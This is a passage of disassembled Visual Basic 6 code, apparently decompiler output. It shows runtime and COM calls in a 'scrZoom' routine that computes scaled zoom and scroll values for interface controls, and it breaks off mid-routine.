008803C2: mov var_04, 00000000h
008803C9: wait 
008803CA: push 008803E5h
008803CF: jmp 8803E4h
008803D1: lea eax, var_1C
008803D4: push eax
008803D5: lea eax, var_18
008803D8: push eax
008803D9: push 00000002h
008803DB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008803E0: add esp, 0000000Ch
008803E3: ret 
End Sub

Private sub scrZoom__87F05C
0087F05C: push ebp
0087F05D: mov ebp, esp
0087F05F: sub esp, 00000014h
0087F062: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0087F067: mov eax, fs:[00h]
0087F06D: push eax
0087F06E: mov fs:[00000000h], esp
0087F075: mov eax, 000001B8h
0087F07A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F07F: push ebx
0087F080: push esi
0087F081: push edi
0087F082: mov var_14, esp
0087F085: mov var_10, 0040D9A8h
0087F08C: mov eax, [ebp+08h]
0087F08F: and eax, 00000001h
0087F092: mov var_0C, eax
0087F095: mov eax, [ebp+08h]
0087F098: and al, FEh
0087F09A: mov [ebp+08h], eax
0087F09D: mov var_08, 00000000h
0087F0A4: mov eax, [ebp+08h]
0087F0A7: mov eax, [eax]
0087F0A9: push [ebp+08h]
0087F0AC: call [eax+04h]
0087F0AF: push 00000001h
0087F0B1: call 00410A60h ; On Error ...
0087F0B6: mov eax, [ebp+08h]
0087F0B9: mov eax, [eax]
0087F0BB: push [ebp+08h]
0087F0BE: call [eax+00000334h]
0087F0C4: push eax
0087F0C5: lea eax, var_28
0087F0C8: push eax
0087F0C9: call 00410A84h ; Set (object)
0087F0CE: mov var_000000AC, eax
0087F0D4: lea eax, var_000000A8
0087F0DA: push eax
0087F0DB: mov eax, var_000000AC
0087F0E1: mov eax, [eax]
0087F0E3: push var_000000AC
0087F0E9: call [eax+000000B8h]
0087F0EF: fclex 
0087F0F1: mov var_000000B0, eax
0087F0F7: cmp var_000000B0, 00000000h
0087F0FE: jnl 87F123h
0087F100: push 000000B8h
0087F105: push 00457C24h
0087F10A: push var_000000AC
0087F110: push var_000000B0
0087F116: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F11B: mov var_000000D4, eax
0087F121: jmp 87F12Ah
0087F123: and var_000000D4, 00000000h
0087F12A: mov eax, [ebp+08h]
0087F12D: fild dword ptr [eax+50h]
0087F130: fstp real8 ptr var_000000DC
0087F136: movsx eax, word ptr var_000000A8
0087F13D: mov ecx, [ebp+08h]
0087F140: mov ecx, [ecx+58h]
0087F143: imul ecx, eax
0087F146: jo 008802A5h
0087F14C: mov var_000000E0, ecx
0087F152: fild dword ptr var_000000E0
0087F158: fstp real8 ptr var_000000E8
0087F15E: fld real8 ptr var_000000E8
0087F164: cmp [008F2000h], 00000000h
0087F16B: jnz 87F175h
0087F16D: fdiv real8 ptr [00407150h]
0087F173: jmp 87F186h
0087F175: push [00407154h]
0087F17B: push [00407150h]
0087F181: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087F186: mov eax, [ebp+08h]
0087F189: fild dword ptr [eax+58h]
0087F18C: fstp real8 ptr var_000000F0
0087F192: fsub real8 ptr var_000000F0
0087F198: cmp [008F2000h], 00000000h
0087F19F: jnz 87F1A9h
0087F1A1: fdiv real8 ptr [00401758h]
0087F1A7: jmp 87F1BAh
0087F1A9: push [0040175Ch]
0087F1AF: push [00401758h]
0087F1B5: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087F1BA: fsubr real8 ptr var_000000DC
0087F1C0: fstsw ax
0087F1C2: test al, 0Dh
0087F1C4: jnz 008802A0h
0087F1CA: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087F1CF: mov ecx, [ebp+08h]
0087F1D2: mov [ecx+60h], eax
0087F1D5: lea ecx, var_28
0087F1D8: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F1DD: mov eax, [ebp+08h]
0087F1E0: mov eax, [eax]
0087F1E2: push [ebp+08h]
0087F1E5: call [eax+00000334h]
0087F1EB: push eax
0087F1EC: lea eax, var_28
0087F1EF: push eax
0087F1F0: call 00410A84h ; Set (object)
0087F1F5: mov var_000000AC, eax
0087F1FB: lea eax, var_000000A8
0087F201: push eax
0087F202: mov eax, var_000000AC
0087F208: mov eax, [eax]
0087F20A: push var_000000AC
0087F210: call [eax+000000B8h]
0087F216: fclex 
0087F218: mov var_000000B0, eax
0087F21E: cmp var_000000B0, 00000000h
0087F225: jnl 87F24Ah
0087F227: push 000000B8h
0087F22C: push 00457C24h
0087F231: push var_000000AC
0087F237: push var_000000B0
0087F23D: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F242: mov var_000000F4, eax
0087F248: jmp 87F251h
0087F24A: and var_000000F4, 00000000h
0087F251: mov eax, [ebp+08h]
0087F254: fild dword ptr [eax+4Ch]
0087F257: fstp real8 ptr var_000000FC
0087F25D: movsx eax, word ptr var_000000A8
0087F264: mov ecx, [ebp+08h]
0087F267: mov ecx, [ecx+54h]
0087F26A: imul ecx, eax
0087F26D: jo 008802A5h
0087F273: mov var_00000100, ecx
0087F279: fild dword ptr var_00000100
0087F27F: fstp real8 ptr var_00000108
0087F285: fld real8 ptr var_00000108
0087F28B: cmp [008F2000h], 00000000h
0087F292: jnz 87F29Ch
0087F294: fdiv real8 ptr [00407150h]
0087F29A: jmp 87F2ADh
0087F29C: push [00407154h]
0087F2A2: push [00407150h]
0087F2A8: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087F2AD: mov eax, [ebp+08h]
0087F2B0: fild dword ptr [eax+54h]
0087F2B3: fstp real8 ptr var_00000110
0087F2B9: fsub real8 ptr var_00000110
0087F2BF: cmp [008F2000h], 00000000h
0087F2C6: jnz 87F2D0h
0087F2C8: fdiv real8 ptr [00401758h]
0087F2CE: jmp 87F2E1h
0087F2D0: push [0040175Ch]
0087F2D6: push [00401758h]
0087F2DC: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087F2E1: fsubr real8 ptr var_000000FC
0087F2E7: fstsw ax
0087F2E9: test al, 0Dh
0087F2EB: jnz 008802A0h
0087F2F1: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087F2F6: mov ecx, [ebp+08h]
0087F2F9: mov [ecx+5Ch], eax
0087F2FC: lea ecx, var_28
0087F2FF: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F304: mov eax, [ebp+08h]
0087F307: mov eax, [eax]
0087F309: push [ebp+08h]
0087F30C: call [eax+00000334h]
0087F312: push eax
0087F313: lea eax, var_28
0087F316: push eax
0087F317: call 00410A84h ; Set (object)
0087F31C: mov var_000000AC, eax
0087F322: lea eax, var_000000A8
0087F328: push eax
0087F329: mov eax, var_000000AC
0087F32F: mov eax, [eax]
0087F331: push var_000000AC
0087F337: call [eax+000000B8h]
0087F33D: fclex 
0087F33F: mov var_000000B0, eax
0087F345: cmp var_000000B0, 00000000h
0087F34C: jnl 87F371h
0087F34E: push 000000B8h
0087F353: push 00457C24h
0087F358: push var_000000AC
0087F35E: push var_000000B0
0087F364: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F369: mov var_00000114, eax
0087F36F: jmp 87F378h
0087F371: and var_00000114, 00000000h
0087F378: movsx eax, word ptr var_000000A8
0087F37F: mov ecx, [ebp+08h]
0087F382: mov ecx, [ecx+58h]
0087F385: imul ecx, eax
0087F388: jo 008802A5h
0087F38E: mov var_00000118, ecx
0087F394: fild dword ptr var_00000118
0087F39A: fstp real8 ptr var_00000120
0087F3A0: fld real8 ptr var_00000120
0087F3A6: cmp [008F2000h], 00000000h
0087F3AD: jnz 87F3B7h
0087F3AF: fdiv real8 ptr [00407150h]
0087F3B5: jmp 87F3C8h
0087F3B7: push [00407154h]
0087F3BD: push [00407150h]
0087F3C3: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087F3C8: fstsw ax
0087F3CA: test al, 0Dh
0087F3CC: jnz 008802A0h
0087F3D2: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087F3D7: mov ecx, [ebp+08h]
0087F3DA: mov [ecx+68h], eax
0087F3DD: lea ecx, var_28
0087F3E0: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F3E5: mov eax, [ebp+08h]
0087F3E8: mov eax, [eax]
0087F3EA: push [ebp+08h]
0087F3ED: call [eax+00000334h]
0087F3F3: push eax
0087F3F4: lea eax, var_28
0087F3F7: push eax
0087F3F8: call 00410A84h ; Set (object)
0087F3FD: mov var_000000AC, eax
0087F403: lea eax, var_000000A8
0087F409: push eax
0087F40A: mov eax, var_000000AC
0087F410: mov eax, [eax]
0087F412: push var_000000AC
0087F418: call [eax+000000B8h]
0087F41E: fclex 
0087F420: mov var_000000B0, eax
0087F426: cmp var_000000B0, 00000000h
0087F42D: jnl 87F452h
0087F42F: push 000000B8h
0087F434: push 00457C24h
0087F439: push var_000000AC
0087F43F: push var_000000B0
0087F445: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F44A: mov var_00000124, eax
0087F450: jmp 87F459h
0087F452: and var_00000124, 00000000h
0087F459: movsx eax, word ptr var_000000A8
0087F460: mov ecx, [ebp+08h]
0087F463: mov ecx, [ecx+54h]
0087F466: imul ecx, eax
0087F469: jo 008802A5h
0087F46F: mov var_00000128, ecx
0087F475: fild dword ptr var_00000128
0087F47B: fstp real8 ptr var_00000130
0087F481: fld real8 ptr var_00000130
0087F487: cmp [008F2000h], 00000000h
0087F48E: jnz 87F498h
0087F490: fdiv real8 ptr [00407150h]
0087F496: jmp 87F4A9h
0087F498: push [00407154h]
0087F49E: push [00407150h]
0087F4A4: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087F4A9: fstsw ax
0087F4AB: test al, 0Dh
0087F4AD: jnz 008802A0h
0087F4B3: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087F4B8: mov ecx, [ebp+08h]
0087F4BB: mov [ecx+64h], eax
0087F4BE: lea ecx, var_28
0087F4C1: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F4C6: mov eax, [ebp+08h]
0087F4C9: mov eax, [eax]
0087F4CB: push [ebp+08h]
0087F4CE: call [eax+000002FCh]
0087F4D4: push eax
0087F4D5: lea eax, var_28
0087F4D8: push eax
0087F4D9: call 00410A84h ; Set (object)
0087F4DE: mov var_000000AC, eax
0087F4E4: mov eax, [ebp+08h]
0087F4E7: fild dword ptr [eax+64h]
0087F4EA: fstp real4 ptr var_00000134
0087F4F0: fld real4 ptr var_00000134
0087F4F6: push ecx
0087F4F7: fstp real4 ptr [esp]
0087F4FA: mov eax, var_000000AC
0087F500: mov eax, [eax]
0087F502: push var_000000AC
0087F508: call [eax+00000084h]
0087F50E: fclex 
0087F510: mov var_000000B0, eax
0087F516: cmp var_000000B0, 00000000h
0087F51D: jnl 87F542h
0087F51F: push 00000084h
0087F524: push 00440EDCh
0087F529: push var_000000AC
0087F52F: push var_000000B0
0087F535: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F53A: mov var_00000138, eax
0087F540: jmp 87F549h
0087F542: and var_00000138, 00000000h
0087F549: lea ecx, var_28
0087F54C: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F551: mov eax, [ebp+08h]
0087F554: mov eax, [eax]
0087F556: push [ebp+08h]
0087F559: call [eax+000002FCh]
0087F55F: push eax
0087F560: lea eax, var_28
0087F563: push eax
0087F564: call 00410A84h ; Set (object)
0087F569: mov var_000000AC, eax
0087F56F: mov eax, [ebp+08h]
0087F572: fild dword ptr [eax+68h]
0087F575: fstp real4 ptr var_0000013C
0087F57B: fld real4 ptr var_0000013C
0087F581: push ecx
0087F582: fstp real4 ptr [esp]
0087F585: mov eax, var_000000AC
0087F58B: mov eax, [eax]
0087F58D: push var_000000AC
0087F593: call [eax+0000008Ch]
0087F599: fclex 
0087F59B: mov var_000000B0, eax
0087F5A1: cmp var_000000B0, 00000000h
0087F5A8: jnl 87F5CDh
0087F5AA: push 0000008Ch
0087F5AF: push 00440EDCh
0087F5B4: push var_000000AC
0087F5BA: push var_000000B0
0087F5C0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F5C5: mov var_00000140, eax
0087F5CB: jmp 87F5D4h
0087F5CD: and var_00000140, 00000000h
0087F5D4: lea ecx, var_28
0087F5D7: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F5DC: mov eax, [ebp+08h]
0087F5DF: mov eax, [eax]
0087F5E1: push [ebp+08h]
0087F5E4: call [eax+00000338h]
0087F5EA: push eax
0087F5EB: lea eax, var_28
0087F5EE: push eax
0087F5EF: call 00410A84h ; Set (object)
0087F5F4: mov var_000000AC, eax
0087F5FA: lea eax, var_2C
0087F5FD: push eax
0087F5FE: mov eax, var_000000AC
0087F604: mov eax, [eax]
0087F606: push var_000000AC
0087F60C: call [eax+60h]
0087F60F: fclex 
0087F611: mov var_000000B0, eax
0087F617: cmp var_000000B0, 00000000h
0087F61E: jnl 87F640h
0087F620: push 00000060h
0087F622: push 00440EDCh
0087F627: push var_000000AC
0087F62D: push var_000000B0
0087F633: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F638: mov var_00000144, eax
0087F63E: jmp 87F647h
0087F640: and var_00000144, 00000000h
0087F647: mov eax, [ebp+08h]
0087F64A: mov eax, [eax]
0087F64C: push [ebp+08h]
0087F64F: call [eax+000002FCh]
0087F655: push eax
0087F656: lea eax, var_34
0087F659: push eax
0087F65A: call 00410A84h ; Set (object)
0087F65F: mov var_000000B4, eax
0087F665: mov var_0000009C, 80020004h
0087F66F: mov var_000000A4, 0000000Ah
0087F679: mov var_0000008C, 80020004h
0087F683: mov var_00000094, 0000000Ah
0087F68D: mov var_7C, 80020004h
0087F694: mov var_00000084, 0000000Ah
0087F69E: mov var_6C, 80020004h
0087F6A5: mov var_74, 0000000Ah
0087F6AC: mov var_5C, 80020004h
0087F6B3: mov var_64, 0000000Ah
0087F6BA: mov eax, [ebp+08h]
0087F6BD: mov eax, [eax+68h]
0087F6C0: mov var_4C, eax
0087F6C3: mov var_54, 00000003h
0087F6CA: mov eax, [ebp+08h]
0087F6CD: mov eax, [eax+64h]
0087F6D0: mov var_3C, eax
0087F6D3: mov var_44, 00000003h
0087F6DA: mov eax, var_2C
0087F6DD: mov var_000000CC, eax
0087F6E3: and var_2C, 00000000h
0087F6E7: push 00000010h
0087F6E9: pop eax
0087F6EA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F6EF: lea esi, var_000000A4
0087F6F5: mov edi, esp
0087F6F7: movsd 
0087F6F8: movsd 
0087F6F9: movsd 
0087F6FA: movsd 
0087F6FB: push 00000010h
0087F6FD: pop eax
0087F6FE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F703: lea esi, var_00000094
0087F709: mov edi, esp
0087F70B: movsd 
0087F70C: movsd 
0087F70D: movsd 
0087F70E: movsd 
0087F70F: push 00000010h
0087F711: pop eax
0087F712: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F717: lea esi, var_00000084
0087F71D: mov edi, esp
0087F71F: movsd 
0087F720: movsd 
0087F721: movsd 
0087F722: movsd 
0087F723: push 00000010h
0087F725: pop eax
0087F726: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F72B: lea esi, var_74
0087F72E: mov edi, esp
0087F730: movsd 
0087F731: movsd 
0087F732: movsd 
0087F733: movsd 
0087F734: push 00000010h
0087F736: pop eax
0087F737: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F73C: lea esi, var_64
0087F73F: mov edi, esp
0087F741: movsd 
0087F742: movsd 
0087F743: movsd 
0087F744: movsd 
0087F745: push 00000010h
0087F747: pop eax
0087F748: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F74D: lea esi, var_54
0087F750: mov edi, esp
0087F752: movsd 
0087F753: movsd 
0087F754: movsd 
0087F755: movsd 
0087F756: push 00000010h
0087F758: pop eax
0087F759: call 004106A0h ; msvbvm60.dll.__vbaChkstk
0087F75E: lea esi, var_44
0087F761: mov edi, esp
0087F763: movsd 
0087F764: movsd 
0087F765: movsd 
0087F766: movsd 
0087F767: fldz 
0087F769: push ecx
0087F76A: fstp real4 ptr [esp]
0087F76D: fldz 
0087F76F: push ecx
0087F770: fstp real4 ptr [esp]
0087F773: push var_000000CC
0087F779: lea eax, var_30
0087F77C: push eax
0087F77D: call 00410A84h ; Set (object)
0087F782: push eax
0087F783: mov eax, var_000000B4
0087F789: mov eax, [eax]
0087F78B: push var_000000B4
0087F791: call [eax+00000280h]
0087F797: fclex 
0087F799: mov var_000000B8, eax
0087F79F: cmp var_000000B8, 00000000h
0087F7A6: jnl 87F7CBh
0087F7A8: push 00000280h
0087F7AD: push 00440EDCh
0087F7B2: push var_000000B4
0087F7B8: push var_000000B8
0087F7BE: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F7C3: mov var_00000148, eax
0087F7C9: jmp 87F7D2h
0087F7CB: and var_00000148, 00000000h
0087F7D2: lea eax, var_34
0087F7D5: push eax
0087F7D6: lea eax, var_30
0087F7D9: push eax
0087F7DA: lea eax, var_28
0087F7DD: push eax
0087F7DE: push 00000003h
0087F7E0: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087F7E5: add esp, 00000010h
0087F7E8: mov eax, [ebp+08h]
0087F7EB: mov eax, [eax]
0087F7ED: push [ebp+08h]
0087F7F0: call [eax+000002FCh]
0087F7F6: push eax
0087F7F7: lea eax, var_34
0087F7FA: push eax
0087F7FB: call 00410A84h ; Set (object)
0087F800: mov var_000000B4, eax
0087F806: mov eax, [ebp+08h]
0087F809: mov eax, [eax]
0087F80B: push [ebp+08h]
0087F80E: call [eax+000002FCh]
0087F814: push eax
0087F815: lea eax, var_28
0087F818: push eax
0087F819: call 00410A84h ; Set (object)
0087F81E: mov var_000000AC, eax
0087F824: lea eax, var_2C
0087F827: push eax
0087F828: mov eax, var_000000AC
0087F82E: mov eax, [eax]
0087F830: push var_000000AC
0087F836: call [eax+00000188h]
0087F83C: fclex 
0087F83E: mov var_000000B0, eax
0087F844: cmp var_000000B0, 00000000h
0087F84B: jnl 87F870h
0087F84D: push 00000188h
0087F852: push 00440EDCh
0087F857: push var_000000AC
0087F85D: push var_000000B0
0087F863: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F868: mov var_0000014C, eax
0087F86E: jmp 87F877h
0087F870: and var_0000014C, 00000000h
0087F877: mov eax, var_2C
0087F87A: mov var_000000D0, eax
0087F880: and var_2C, 00000000h
0087F884: push var_000000D0
0087F88A: lea eax, var_30
0087F88D: push eax
0087F88E: call 00410A84h ; Set (object)
0087F893: push eax
0087F894: mov eax, var_000000B4
0087F89A: mov eax, [eax]
0087F89C: push var_000000B4
0087F8A2: call [eax+64h]
0087F8A5: fclex 
0087F8A7: mov var_000000B8, eax
0087F8AD: cmp var_000000B8, 00000000h
0087F8B4: jnl 87F8D6h
0087F8B6: push 00000064h
0087F8B8: push 00440EDCh
0087F8BD: push var_000000B4
0087F8C3: push var_000000B8
0087F8C9: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F8CE: mov var_00000150, eax
0087F8D4: jmp 87F8DDh
0087F8D6: and var_00000150, 00000000h
0087F8DD: lea eax, var_34
0087F8E0: push eax
0087F8E1: lea eax, var_30
0087F8E4: push eax
0087F8E5: lea eax, var_28
0087F8E8: push eax
0087F8E9: push 00000003h
0087F8EB: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0087F8F0: add esp, 00000010h
0087F8F3: mov eax, [ebp+08h]
0087F8F6: mov eax, [eax]
0087F8F8: push [ebp+08h]
0087F8FB: call [eax+000002FCh]
0087F901: push eax
0087F902: lea eax, var_28
0087F905: push eax
0087F906: call 00410A84h ; Set (object)
0087F90B: mov var_000000AC, eax
0087F911: mov eax, [ebp+08h]
0087F914: fild dword ptr [eax+64h]
0087F917: fstp real4 ptr var_00000154
0087F91D: fld real4 ptr var_00000154
0087F923: push ecx
0087F924: fstp real4 ptr [esp]
0087F927: mov eax, var_000000AC
0087F92D: mov eax, [eax]
0087F92F: push var_000000AC
0087F935: call [eax+00000084h]
0087F93B: fclex 
0087F93D: mov var_000000B0, eax
0087F943: cmp var_000000B0, 00000000h
0087F94A: jnl 87F96Fh
0087F94C: push 00000084h
0087F951: push 00440EDCh
0087F956: push var_000000AC
0087F95C: push var_000000B0
0087F962: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F967: mov var_00000158, eax
0087F96D: jmp 87F976h
0087F96F: and var_00000158, 00000000h
0087F976: lea ecx, var_28
0087F979: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087F97E: mov eax, [ebp+08h]
0087F981: mov eax, [eax]
0087F983: push [ebp+08h]
0087F986: call [eax+000002FCh]
0087F98C: push eax
0087F98D: lea eax, var_28
0087F990: push eax
0087F991: call 00410A84h ; Set (object)
0087F996: mov var_000000AC, eax
0087F99C: mov eax, [ebp+08h]
0087F99F: fild dword ptr [eax+68h]
0087F9A2: fstp real4 ptr var_0000015C
0087F9A8: fld real4 ptr var_0000015C
0087F9AE: push ecx
0087F9AF: fstp real4 ptr [esp]
0087F9B2: mov eax, var_000000AC
0087F9B8: mov eax, [eax]
0087F9BA: push var_000000AC
0087F9C0: call [eax+0000008Ch]
0087F9C6: fclex 
0087F9C8: mov var_000000B0, eax
0087F9CE: cmp var_000000B0, 00000000h
0087F9D5: jnl 87F9FAh
0087F9D7: push 0000008Ch
0087F9DC: push 00440EDCh
0087F9E1: push var_000000AC
0087F9E7: push var_000000B0
0087F9ED: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087F9F2: mov var_00000160, eax
0087F9F8: jmp 87FA01h
0087F9FA: and var_00000160, 00000000h
0087FA01: lea ecx, var_28
0087FA04: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087FA09: mov eax, [ebp+08h]
0087FA0C: mov eax, [eax]
0087FA0E: push [ebp+08h]
0087FA11: call [eax+0000033Ch]
0087FA17: push eax
0087FA18: lea eax, var_28
0087FA1B: push eax
0087FA1C: call 00410A84h ; Set (object)
0087FA21: mov var_000000AC, eax
0087FA27: mov eax, var_000000AC
0087FA2D: mov eax, [eax]
0087FA2F: push var_000000AC
0087FA35: call [eax+00000278h]
0087FA3B: fclex 
0087FA3D: mov var_000000B0, eax
0087FA43: cmp var_000000B0, 00000000h
0087FA4A: jnl 87FA6Fh
0087FA4C: push 00000278h
0087FA51: push 00440EDCh
0087FA56: push var_000000AC
0087FA5C: push var_000000B0
0087FA62: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FA67: mov var_00000164, eax
0087FA6D: jmp 87FA76h
0087FA6F: and var_00000164, 00000000h
0087FA76: lea ecx, var_28
0087FA79: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087FA7E: mov eax, [ebp+08h]
0087FA81: mov eax, [eax]
0087FA83: push [ebp+08h]
0087FA86: call [eax+00000738h]
0087FA8C: mov eax, [ebp+08h]
0087FA8F: movsx eax, word ptr [eax+34h]
0087FA93: test eax, eax
0087FA95: jz 0087FE3Dh
0087FA9B: mov eax, [ebp+08h]
0087FA9E: mov eax, [eax]
0087FAA0: push [ebp+08h]
0087FAA3: call [eax+00000334h]
0087FAA9: push eax
0087FAAA: lea eax, var_28
0087FAAD: push eax
0087FAAE: call 00410A84h ; Set (object)
0087FAB3: mov var_000000AC, eax
0087FAB9: lea eax, var_000000A8
0087FABF: push eax
0087FAC0: mov eax, var_000000AC
0087FAC6: mov eax, [eax]
0087FAC8: push var_000000AC
0087FACE: call [eax+000000B8h]
0087FAD4: fclex 
0087FAD6: mov var_000000B0, eax
0087FADC: cmp var_000000B0, 00000000h
0087FAE3: jnl 87FB08h
0087FAE5: push 000000B8h
0087FAEA: push 00457C24h
0087FAEF: push var_000000AC
0087FAF5: push var_000000B0
0087FAFB: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FB00: mov var_00000168, eax
0087FB06: jmp 87FB0Fh
0087FB08: and var_00000168, 00000000h
0087FB0F: movsx eax, word ptr var_000000A8
0087FB16: mov ecx, [ebp+08h]
0087FB19: mov ecx, [ecx+00000080h]
0087FB1F: imul ecx, eax
0087FB22: jo 008802A5h
0087FB28: mov var_0000016C, ecx
0087FB2E: fild dword ptr var_0000016C
0087FB34: fstp real8 ptr var_00000174
0087FB3A: fld real8 ptr var_00000174
0087FB40: cmp [008F2000h], 00000000h
0087FB47: jnz 87FB51h
0087FB49: fdiv real8 ptr [00407150h]
0087FB4F: jmp 87FB62h
0087FB51: push [00407154h]
0087FB57: push [00407150h]
0087FB5D: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087FB62: fstsw ax
0087FB64: test al, 0Dh
0087FB66: jnz 008802A0h
0087FB6C: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087FB71: mov ecx, [ebp+08h]
0087FB74: mov [ecx+70h], eax
0087FB77: lea ecx, var_28
0087FB7A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087FB7F: mov eax, [ebp+08h]
0087FB82: mov eax, [eax]
0087FB84: push [ebp+08h]
0087FB87: call [eax+00000334h]
0087FB8D: push eax
0087FB8E: lea eax, var_28
0087FB91: push eax
0087FB92: call 00410A84h ; Set (object)
0087FB97: mov var_000000AC, eax
0087FB9D: lea eax, var_000000A8
0087FBA3: push eax
0087FBA4: mov eax, var_000000AC
0087FBAA: mov eax, [eax]
0087FBAC: push var_000000AC
0087FBB2: call [eax+000000B8h]
0087FBB8: fclex 
0087FBBA: mov var_000000B0, eax
0087FBC0: cmp var_000000B0, 00000000h
0087FBC7: jnl 87FBECh
0087FBC9: push 000000B8h
0087FBCE: push 00457C24h
0087FBD3: push var_000000AC
0087FBD9: push var_000000B0
0087FBDF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FBE4: mov var_00000178, eax
0087FBEA: jmp 87FBF3h
0087FBEC: and var_00000178, 00000000h
0087FBF3: movsx eax, word ptr var_000000A8
0087FBFA: mov ecx, [ebp+08h]
0087FBFD: mov ecx, [ecx+7Ch]
0087FC00: imul ecx, eax
0087FC03: jo 008802A5h
0087FC09: mov var_0000017C, ecx
0087FC0F: fild dword ptr var_0000017C
0087FC15: fstp real8 ptr var_00000184
0087FC1B: fld real8 ptr var_00000184
0087FC21: cmp [008F2000h], 00000000h
0087FC28: jnz 87FC32h
0087FC2A: fdiv real8 ptr [00407150h]
0087FC30: jmp 87FC43h
0087FC32: push [00407154h]
0087FC38: push [00407150h]
0087FC3E: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087FC43: fstsw ax
0087FC45: test al, 0Dh
0087FC47: jnz 008802A0h
0087FC4D: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087FC52: mov ecx, [ebp+08h]
0087FC55: mov [ecx+6Ch], eax
0087FC58: lea ecx, var_28
0087FC5B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087FC60: mov eax, [ebp+08h]
0087FC63: mov eax, [eax]
0087FC65: push [ebp+08h]
0087FC68: call [eax+00000334h]
0087FC6E: push eax
0087FC6F: lea eax, var_28
0087FC72: push eax
0087FC73: call 00410A84h ; Set (object)
0087FC78: mov var_000000AC, eax
0087FC7E: lea eax, var_000000A8
0087FC84: push eax
0087FC85: mov eax, var_000000AC
0087FC8B: mov eax, [eax]
0087FC8D: push var_000000AC
0087FC93: call [eax+000000B8h]
0087FC99: fclex 
0087FC9B: mov var_000000B0, eax
0087FCA1: cmp var_000000B0, 00000000h
0087FCA8: jnl 87FCCDh
0087FCAA: push 000000B8h
0087FCAF: push 00457C24h
0087FCB4: push var_000000AC
0087FCBA: push var_000000B0
0087FCC0: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0087FCC5: mov var_00000188, eax
0087FCCB: jmp 87FCD4h
0087FCCD: and var_00000188, 00000000h
0087FCD4: movsx eax, word ptr var_000000A8
0087FCDB: mov ecx, [ebp+08h]
0087FCDE: mov ecx, [ecx+00000088h]
0087FCE4: imul ecx, eax
0087FCE7: jo 008802A5h
0087FCED: mov var_0000018C, ecx
0087FCF3: fild dword ptr var_0000018C
0087FCF9: fstp real8 ptr var_00000194
0087FCFF: fld real8 ptr var_00000194
0087FD05: cmp [008F2000h], 00000000h
0087FD0C: jnz 87FD16h
0087FD0E: fdiv real8 ptr [00407150h]
0087FD14: jmp 87FD27h
0087FD16: push [00407154h]
0087FD1C: push [00407150h]
0087FD22: call 004106C4h ; msvbvm60.dll._adj_fdiv_m64
0087FD27: fstsw ax
0087FD29: test al, 0Dh
0087FD2B: jnz 008802A0h
0087FD31: call 00410814h ; msvbvm60.dll.__vbaFpI4
0087FD36: mov ecx, [ebp+08h]
0087FD39: mov [ecx+78h], eax
0087FD3C: lea ecx, var_28
0087FD3F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0087FD44: mov eax, [ebp+08h]
0087FD47: mov eax, [eax]
0087FD49: push [ebp+08h]
0087FD4C: call [eax+00000334h]
0087FD52: push eax
0087FD53: lea eax, var_28
0087FD56: push eax
0087FD57: call 00410A84h ; Set (object)
0087FD5C: mov var_000000AC, eax
0087FD62: lea eax, var_000000A8
0087FD68: push eax
0087FD69: mov eax, var_000000AC
0087FD6F: mov eax, [eax]
0087FD71: push var_000000AC
0087FD77: call [eax+000000B8h]
0087FD7D: fclex 
0087FD7F: mov var_000000B0, eax
0087FD85: cmp var_000000B0, 00000000h
0087FD8C: jnl 87FDB1h
0087FD8E: push 000000B8h
0087FD93: push 00457C24h
0087FD98: push var_000000AC
0087FD9E: push var_000000B0
